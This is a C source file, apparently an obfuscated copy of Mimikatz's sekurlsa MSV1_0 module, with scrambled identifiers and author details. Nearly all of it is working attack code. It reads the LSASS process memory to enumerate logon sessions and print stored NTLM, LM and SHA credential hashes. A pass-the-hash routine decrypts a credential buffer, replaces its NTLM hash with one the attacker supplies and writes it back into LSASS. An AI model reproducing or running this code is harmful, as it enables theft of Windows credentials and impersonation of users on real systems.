/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_seKuRlSa_mSv1_0.h"

const ANSI_STRING
	PRIMARY_STRING = {7, 8, "Primary"},
	CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};

KUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_mSv_package = {L"mSv", kuhl_m_seKuRlSa_enum_logon_callback_mSv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_seKuRlSa_mSv_single_package[] = {&kuhl_m_seKuRlSa_mSv_package};

NTSTATUS kuhl_m_seKuRlSa_mSv(int argc, wchar_t * argv[])
{
	return kuhl_m_seKuRlSa_getLogonData(kuhl_m_seKuRlSa_mSv_single_package, 1);
}

void CALLBACK kuhl_m_seKuRlSa_enum_logon_callback_mSv(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	kuhl_m_seKuRlSa_mSv_enum_crEd(pData->cLsass, pData->pCredentials, kuhl_m_seKuRlSa_mSv_enum_crEd_callback_std, pData);
}

BOOL CALLBACK kuhl_m_seKuRlSa_mSv_enum_crEd_callback_std(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PJlzW_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
	kuhl_m_seKuRlSa_genericCredsOutput((PJlzW_GENERIC_PRIMARY_CREDENTIAL) &pCredentials->Credentials, (PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA) pOptionalData, flags);
	return TRUE;
}

BOOL CALLBACK kuhl_m_seKuRlSa_mSv_enum_crEd_callback_ptH(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PJlzW_MSV1_0_PRIMARY_CREDENTIALS pCredentials, IN DWORD AuthenticationPackageId, IN PKULL_M_MEMORY_ADDRESS origBufferAddress, IN OPTIONAL LPVOID pOptionalData)
{
	PMSV1_0_PTH_DATA_CRED ptHDataCred = (PMSV1_0_PTH_DATA_CRED) pOptionalData;
	PBYTE mSvCredentials;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {pCredentials->Credentials.Buffer, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	const MSV1_0_PRIMARY_HELPER * helper = kuhl_m_seKuRlSa_mSv_helper(cLsass);

	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
	{
		if(mSvCredentials = (PBYTE) pCredentials->Credentials.Buffer)
		{
			(*ptHDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(mSvCredentials, pCredentials->Credentials.Length);
			*(PBOOLEAN) (mSvCredentials + helper->offsetToisLmOwfPassword) = FALSE;
			*(PBOOLEAN) (mSvCredentials + helper->offsetToisShaOwPassword) = FALSE;
			if(helper->offsetToisIso)
				*(PBOOLEAN) (mSvCredentials + helper->offsetToisIso) = FALSE;
			if(helper->offsetToisDPAPIProtected)
			{
				*(PBOOLEAN) (mSvCredentials + helper->offsetToisDPAPIProtected) = FALSE;
				RtlZeroMemory(mSvCredentials + helper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH);
			}
			RtlZeroMemory(mSvCredentials + helper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
			RtlZeroMemory(mSvCredentials + helper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);
			if(ptHDataCred->ptHData->NtlmHash)
			{
				*(PBOOLEAN) (mSvCredentials + helper->offsetToisNtOwfPassword) = TRUE;
				RtlCopyMemory(mSvCredentials + helper->offsetToNtOwfPassword, ptHDataCred->ptHData->NtlmHash, LM_NTLM_HASH_LENGTH);
			}
			else
			{
				*(PBOOLEAN) (mSvCredentials + helper->offsetToisNtOwfPassword) = FALSE;
				RtlZeroMemory(mSvCredentials + helper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);
			}
			(*ptHDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(mSvCredentials, pCredentials->Credentials.Length);

			kprintf(L"data copy @ %p : ", origBufferAddress->address);
			if(ptHDataCred->ptHData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
				kprintf(L"OK !");
			else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
		}
	}
	else kprintf(L".");
	return TRUE;
}

BOOL CALLBACK kuhl_m_seKuRlSa_enum_callback_mSv_ptH(IN PJlzW_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
	PSEKURLSA_PTH_DATA ptHData = (PSEKURLSA_PTH_DATA) pOptionalData;
	MSV1_0_PTH_DATA_CRED crEdData = {pData, ptHData};
	
	if(SecEqualLuid(pData->LogonId, ptHData->LogonId))
	{
		kuhl_m_seKuRlSa_mSv_enum_crEd(pData->cLsass, pData->pCredentials, kuhl_m_seKuRlSa_mSv_enum_crEd_callback_ptH, &crEdData);
		return FALSE;
	}
	else return TRUE;
}

VOID kuhl_m_seKuRlSa_mSv_enum_crEd(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK crEdCallback, IN PVOID optionalData)
{
	JlzW_MSV1_0_CREDENTIALS crEdentials;
	JlzW_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {pCredentials, cLsass->hLsassMem};

	while(aLsassMemory.address)
	{
		aLocalMemory.address = &crEdentials;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_MSV1_0_CREDENTIALS)))
		{
			aLsassMemory.address = crEdentials.PrimaryCredentials;
			while(aLsassMemory.address)
			{
				aLocalMemory.address = &primaryCredentials;
				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(JlzW_MSV1_0_PRIMARY_CREDENTIALS)))
				{
					aLsassMemory.address = primaryCredentials.Credentials.Buffer;
					if(kull_m_ProCeSs_getUnicodeString(&primaryCredentials.Credentials, cLsass->hLsassMem))
					{
						if(kull_m_ProCeSs_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, cLsass->hLsassMem))
						{
							crEdCallback(cLsass, &primaryCredentials, crEdentials.AuthenticationPackageId, &aLsassMemory, optionalData);
							LocalFree(primaryCredentials.Primary.Buffer);
						}
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else kprintf(L"n.e. (JlzW_MSV1_0_PRIMARY_CREDENTIALS KO)");
				aLsassMemory.address = primaryCredentials.next;
			}
			aLsassMemory.address = crEdentials.next;
		} else kprintf(L"n.e. (JlzW_MSV1_0_CREDENTIALS KO)");
	}
}

const MSV1_0_PRIMARY_HELPER mSv1_0_primaryHelper[] = {
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName),			0,														FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword),			0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword),			0,																	0},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isDPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, ShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, DPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword)},
};

const MSV1_0_PRIMARY_HELPER * kuhl_m_seKuRlSa_mSv_helper(PKUHL_M_SEKURLSA_CONTEXT context)
{
	const MSV1_0_PRIMARY_HELPER * helper;
	if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1507)
		helper = &mSv1_0_primaryHelper[0];
	else if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1511)
		helper = &mSv1_0_primaryHelper[1];
	else if(context->osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
		helper = &mSv1_0_primaryHelper[2];
	else
		helper = &mSv1_0_primaryHelper[3];
	return helper;
}